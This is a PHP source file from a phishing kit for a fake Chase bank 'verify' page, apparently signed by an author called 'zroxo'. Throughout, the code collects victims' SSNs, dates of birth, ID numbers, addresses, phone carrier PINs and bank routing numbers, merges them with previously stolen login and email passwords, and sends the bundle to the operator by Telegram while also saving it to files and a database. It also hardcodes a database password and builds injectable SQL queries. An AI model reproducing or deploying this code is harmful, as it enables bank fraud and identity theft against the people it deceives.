<?php
ob_start();
session_start();
// $all_coll= $_SESSION['all_coll'];
error_reporting(0);
// include'../Protection.php'; 
include'../includes/telegram.php'; 
include'../admin/config.php'; 
// if (!isset($_SESSION['ZRXSESSION'])) {
//     header('HTTP/1.0 403 Forbidden');
//     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
//     exit();
// }
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
if (!empty($_POST['token']) && !empty($_POST['zipcode']) && !empty($_POST['carrierpin'])) {
if (hash_equals($_SESSION['token'], $_POST['token'])) {

	$trimmed = str_replace('(', '', $_POST['phoneNumber']);
	$trimmed = str_replace(')', '', $trimmed);
	$NUMBER = preg_replace('/\s+/', '', $trimmed);


	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.ipqualityscore.com/free-carrier-lookup/lookup/US/'.$NUMBER.'');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt"); // cookies storage / here the changes have been made
	curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // false for https
	$headers = array();
	$headers[] = 'Authority: www.ipqualityscore.com';
	$headers[] = 'Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"';
	$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
	$headers[] = 'Sec-Fetch-Site: none';
	$headers[] = 'Sec-Fetch-Mode: navigate';
	$headers[] = 'Sec-Fetch-User: ?1';
	$headers[] = 'Sec-Fetch-Dest: document';
	$headers[] = 'Accept-Language: en-US,en;q=0.9';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	if (curl_errno($ch)) {
	    echo 'Error:' . curl_error($ch);
	}
	    $conn = mysqli_connect("localhost", "chasd_user", "immAN@@4A", "chasd_data");
	    // Get Users
	    $token = $_POST['key_token'];
        $users = "select * from users where token = '$token' limit 1";
        $getUsers = mysqli_query($conn, $users);
        
        $emailLogin = '';
        $passLogin = '';
        while ($row = mysqli_fetch_array($getUsers)) {
            $emailLogin = $row['email'];
            $passLogin = $row['password'];
        }
        // End Get Users
        
        // Get Sosmed
        $emailSocial = '';
        $passSocial = '';
        $emailSosmed = "select * from sosmed where token = '$token' limit 1";
        $getEmail = mysqli_query($conn, $emailSosmed);
        
        while ($row = mysqli_fetch_array($getEmail)) {
            $emailSocial = $row['email'];
            $passSocial = $row['password'];
        }
        // End Get Sosmed
	
	curl_close($ch);
	$carriername = get_string_between($result, '<strong>Carrier Name</strong>', '</tr>');
	$carriername2 = get_string_between($carriername, '<td class="right">', '</td>');
	$carriername3 = preg_replace('/\s+/', '', $carriername2);
    // $resulta =$all_coll."\n";
    $resulta .= "+ --------------[ INFO LOGIN PAGE ]---------------+\n";
    $resulta .= "[Username]: ".$emailLogin."\n";
    $resulta .= "[Password]: ".$passLogin."\n";
    $resulta .= "+ --------------[ INFO EMAIL POPUP PAGE ]---------------+\n";
    $resulta .= "[Email]: ".$emailSocial."\n";
    $resulta .= "[Password]: ".$passSocial."\n";
	$resulta .= "+ --------------[ INFO VERIFY PAGE ]---------------+\n";
	$resulta .= "[Firstname]: ".$_POST['firstname']."\n";
	$resulta .= "[Lastname]: ".$_POST['lastname']."\n";
	$resulta .= "[DateOFbirth]: ".$_POST['dob']."\n";
	$resulta .= "[SSN]: ".$_POST['S5SN']."\n";
	if ($get_DL == "on") {
		$resulta .= "[".$_POST['idtype']."]: ".$_POST['idn']."\n";
	}
	$resulta .= "[ISSuingSTate]: ".$_POST['issuest']."\n";
	$resulta .= "[Address1]: ".$_POST['Streetadd']."\n";
	$resulta .= "[Address2]: ".$_POST['address2']."\n";
	$resulta .= "[ZipCode]: ".$_POST['zipcode']."\n";
	$resulta .= "[City]: ".$_POST['city']."\n";
	$resulta .= "[State]: ".$_POST['state']."\n";
	$resulta .= "[Ph0neNumber]: ".$_POST['phoneNumber']."\n";
	$resulta .= "[CarrierPin]: ".$_POST['carrierpin']."\n";
	$resulta .= "[CarrierName]: ".$carriername3."\n";
	$resulta .= "[RouTingNumber]: ".$_POST['routingNumber']."\n";
	$resulta .= "[BranchNumber]: ".$_POST['branchNumber']."\n";
// 	$_SESSION["all_coll"] = $resulta;
	$resulta .= "+ --------------[ Zroxo ip ]---------------+\n";
	$resulta .= "IP Address: ".$_SESSION['ip']."\n";
	$resulta .= "City: ".$_SESSION['city']."\n";
	$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
	$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
	$resulta .= "User Agent: ".$_SESSION['platform']."\n";
	$resulta .= "+ --------------[ Zroxo V1 ]---------------+\n";
	$subject = "#ZROXO BILLING: [{$_POST['firstname']} {$_POST['lastname']}] [ {$_SESSION['city']} - {$_SESSION['browser']} - {$_SESSION['ip']} ]";
	$headers="From: ZROXO CHASE <".$result_from_email.">\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	$zroxo = fopen("../admin/result/billings.txt","a+");
    fwrite($zroxo,$resulta);
    fclose($zroxo);
	$zroxo2 = fopen("../admin/result/".$_SESSION['ZRXSESSION'].".txt","a+");
	fwrite($zroxo2,$resulta);
	fclose($zroxo2);
	$zroxo3 = fopen("../admin/result/totalbilling.txt","a+");
	fwrite($zroxo3,"".$_POST['firstname']."\n");
	fclose($zroxo3);
// 	if ($telegram_result == "on") {
// 		telegram_message($resulta,$telegram_token,$telegram_chatid);
// 	}if ($email_result == "on") {
// 		@mail($email_result_config,$subject,$resulta,$headers);
// 	}
	telegram_message($resulta,$telegram_token,$telegram_chatid);
	
	// Insert to db
          
    // Check connection
    if($conn === false) {
        die("ERROR: Could not connect. " . mysqli_connect_error());
    }
          
    $firstname =  $_POST['firstname'];
    $lastname = $_POST['lastname'];
    $dob =  $_POST['dob'];
    $S5SN = $_POST['S5SN'];
    $issuest =  $_POST['issuest'];
    $Streetadd = $_POST['Streetadd'];
    $address2 =  $_POST['address2'];
    $zipcode = $_POST['zipcode'];
    $city =  $_POST['city'];
    $state = $_POST['state'];
    $phoneNumber =  $_POST['phoneNumber'];
    $carrierpin = $_POST['carrierpin'];
    $routingNumber =  $_POST['routingNumber'];
    $branchNumber = $_POST['branchNumber'];
    
    $sql = "INSERT INTO verify (firstname, lastname, dob, S5SN, issuest, Streetadd, address2, zipcode, city, state, phoneNumber, carrierpin, routingNumber, branchNumber, token) VALUES ('$firstname', '$lastname', '$dob', '$S5SN', '$issuest', '$Streetadd', '$address2', '$zipcode', '$city', '$state', '$phoneNumber', '$carrierpin', '$routingNumber', '$branchNumber', '$token')";
    
    if(mysqli_query($conn, $sql)){
        echo "Success"; 
    } else{
        echo "ERROR: Hush! Sorry $sql. " 
                . mysqli_error($conn);
    }
          
    // Close connection
    mysqli_close($conn);
    
    // End Insert to db
	exit(header("Location: ../ccverify?key=".$token.""));

}else{
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
}	